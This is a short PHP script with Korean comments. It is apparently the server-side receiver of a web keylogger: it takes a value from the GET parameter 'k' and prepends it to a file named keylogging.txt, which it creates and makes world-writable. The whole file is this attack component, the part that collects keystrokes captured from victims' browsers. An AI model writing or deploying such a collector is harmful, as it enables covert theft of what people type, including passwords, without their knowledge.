<?php
$aa = $_GET['k'];
?>

<?php
$파일 = './keylogging.txt';
if ( !is_file($파일) ) { touch($파일); chmod($파일,0777); } // 파일 없으면 생성
file_put_contents($파일,$aa.file_get_contents($파일)); // 
?>
